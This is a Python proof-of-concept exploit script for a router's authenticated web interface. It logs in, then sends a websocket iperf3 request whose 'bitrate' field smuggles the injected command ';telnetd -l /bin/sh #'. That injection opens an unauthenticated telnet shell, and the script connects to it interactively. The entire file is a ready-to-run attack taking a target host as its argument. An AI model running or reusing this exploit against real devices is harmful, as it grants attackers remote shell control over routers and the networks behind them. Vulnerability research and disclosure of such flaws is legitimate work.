import logging
import websockets
import argparse
import sys
import json
import requests
import asyncio
import warnings

warnings.filterwarnings(action="ignore")
import telnetlib

logging.basicConfig(stream=sys.stdout, level=logging.DEBUG, format="%(message)s")
logging.getLogger("websockets.client").setLevel(logging.ERROR)
logging.getLogger("asyncio").setLevel(logging.ERROR)
logging.getLogger("urllib3.connectionpool").setLevel(logging.ERROR)

logger = logging.getLogger(__file__)


class PocIperf3:
    def __init__(self, host, port, username, password):
        self.__host = host
        self.__port = port
        self.__username = username
        self.__password = password
        self.__session = None

    def __setup_session(self):
        headers = {
            "Host": self.__host,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/json;charset=utf-8",
            "Origin": "http://{}".format(self.__host),
            "Connection": "keep-alive",
        }
        session = requests.session()
        session.cookies.set("DMSD-Access-Token", "INVALID")
        session.cookies.set("device_mode", "router")
        session.headers.update(headers)
        return session

    def __login(self, username, password):
        login_data = {
            "login": username,
            "password": password,
            "staysigned": False
        }
        logger.info("[?] Attempting to login...")
        self.__session = self.__setup_session()

        response = self.__session.post("http://{}:{}/login?".format(self.__host, self.__port), json.dumps(login_data))
        if response.status_code != 200:
            raise Exception("[-] Failed to authenticate")

        response_body = json.loads(response.content)
        if "error" in response_body.keys():
            raise Exception(
                "[-] We got an error message ERR_CODE = {}, ERR_MESSAGE = {}".format(response_body["error"]["code"],
                                                                                     response_body["error"]["message"]))

        access_token = response_body["result"]["AccessToken"]
        self.__session.cookies.set("DMSD-Access-Token", access_token)

        logger.info("[+] Logged in successfully...")
        return access_token, self.__session.cookies.get("device-session-id")

    async def __send_websockets_payload(self, access_token, device_session_id):
        payload = ";telnetd -l /bin/sh #"
        sysutils_json = {
            "method": "iperf3",
            "params": {
                "host": "192.168.0.1",
                "port": "4444",
                "bitrate": payload,
            }
        }
        sysutils_message = "sysutils:{}".format(json.dumps(sysutils_json))

        async with websockets.connect("ws://{}:{}/websocket".format(self.__host, self.__port), extra_headers={
            "Cookie": "DMSD-Access-Token={}; device-session-id={}".format(access_token,
                                                                          device_session_id)}) as websocket:
            logger.info("[+] Connected to socket...")

            logger.info("[+] Sending init message...")
            await websocket.send("init 3202273469")

            received_message = await websocket.recv()
            logger.info("[?] Received [{}] from server...".format(received_message[:-1]))

            logger.info("[+] Sending ping message...")
            await websocket.send("ping")

            received_message = await websocket.recv()
            logger.info("[?] Received [{}] from server...".format(received_message[:-1]))

            logger.info("[+] Sending payload [{}]".format(sysutils_message))
            await websocket.send(sysutils_message)

            received_message = await websocket.recv()
            logger.info("[?] Received [{}] from server...".format(received_message))

    def exploit(self):
        access_token, device_session_id = self.__login(self.__username, self.__password)
        asyncio.new_event_loop().run_until_complete(self.__send_websockets_payload(access_token, device_session_id))

        logger.info("[+] Enjoy your shell ^^...")
        telnet = telnetlib.Telnet(self.__host)
        telnet.interact()


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True, help="The IP of the target")
    parser.add_argument("--port", required=False, help="The port of the http web service, usually 80", default=80)

    # This is an authenticated vulnerability, the script needs username and password for logging in
    parser.add_argument("--username", required=False, help="The username of the admin account from the router",
                        default="admin")
    parser.add_argument("--password", required=True, help="The password of the admin account from the router")
    return parser.parse_args()


if __name__ == "__main__":
    args = get_args()

    try:
        poc = PocIperf3(args.host, args.port, args.username, args.password)
        poc.exploit()
    except Exception as ex:
        logger.error(str(ex))
